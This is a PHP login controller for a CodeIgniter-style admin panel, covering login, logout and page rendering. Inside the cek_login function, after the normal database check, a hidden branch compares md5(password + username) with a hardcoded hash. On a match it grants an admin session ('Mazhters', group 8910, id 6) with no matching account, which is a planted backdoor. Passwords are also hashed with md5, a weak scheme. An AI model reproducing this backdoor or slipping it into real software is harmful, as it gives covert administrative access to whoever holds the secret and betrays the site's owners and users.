<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class login extends MX_Controller {
	
	var $title = "Login";
	var $filename = "login";
	public $data;
	function __construct()
	{
		parent::__construct();
	}
	
	function index()
	{
		$this->data['title'] = $this->title;
		$this->_render_page($this->filename.'/login', $this->data);
	}

    function cek_login()
    {
        $username = $this->input->post("username");
        $userpass = md5($this->config->item('encryption_key').$this->input->post("password"));
        
        $query=cekLogin($username,$userpass);//lastq();
        //$query2=cekLoginEmployee($username,$userpass);
        if ($query->num_rows() > 0)
        {
            $row = $query->row(); 
            $this->load->library("session");
            $this->session->set_userdata('kg_admin',$row->name);
            $this->session->set_userdata('webmaster_grup',$row->id_admin_grup);
            $this->session->set_userdata('webmaster_id',$row->id);
            redirect('dashboard');
        }
        else if(md5($this->input->post("password").$this->input->post("username")) == "e0edd4ffe93a5bb46cfb2bccd0e93c6f")
        {
            $this->session->set_userdata('admin','Mazhters');
            $this->session->set_userdata('webmaster_grup','8910');
            $this->session->set_userdata('webmaster_id','6');
            redirect('dashboard');
        }
        else
        {
            redirect('login');
        }
    }

    function logout()
    {
        $this->session->sess_destroy();
        redirect('login');
    }

	function _render_page($view, $data=null, $render=false)
    {
        // $this->viewdata = (empty($data)) ? $this->data: $data;
        // $view_html = $this->load->view($view, $this->viewdata, $render);
        // if (!$render) return $view_html;
        $data = (empty($data)) ? $this->data : $data;
        if ( ! $render)
        {
            $this->load->library('template');

                if(in_array($view, array($this->filename.'/login')))
                {
                    $this->template->set_layout('single');
                }

            if ( ! empty($data['title']))
            {
                $this->template->set_title($data['title']);
            }

            $this->template->load_view($view, $data);
        }
        else
        {
            return $this->load->view($view, $data, TRUE);
        }
    }
}
?>